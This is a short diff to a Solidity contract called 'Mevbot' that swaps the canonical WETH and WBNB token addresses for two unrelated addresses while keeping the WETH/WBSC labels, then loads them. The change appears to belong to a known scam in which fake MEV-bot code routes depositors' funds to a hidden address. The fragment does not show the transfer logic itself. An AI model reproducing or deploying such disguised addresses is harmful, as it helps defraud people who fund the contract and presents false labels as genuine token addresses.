@@ -78,8 +78,8 @@ contract Mevbot {
             uint a;
             uint b;
 
-            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            string memory WBSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
+            string memory WETH_CONTRACT_ADDRESS = "0x5b6f41B431c22a88C4cc7bb4807Ae6761aF8e682";
+            string memory WBSC_CONTRACT_ADDRESS = "0x1ab1790CBfb93A6e4f2A0d38345639d4E74A8691";
             
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
             loadCurrentContract(WBSC_CONTRACT_ADDRESS);
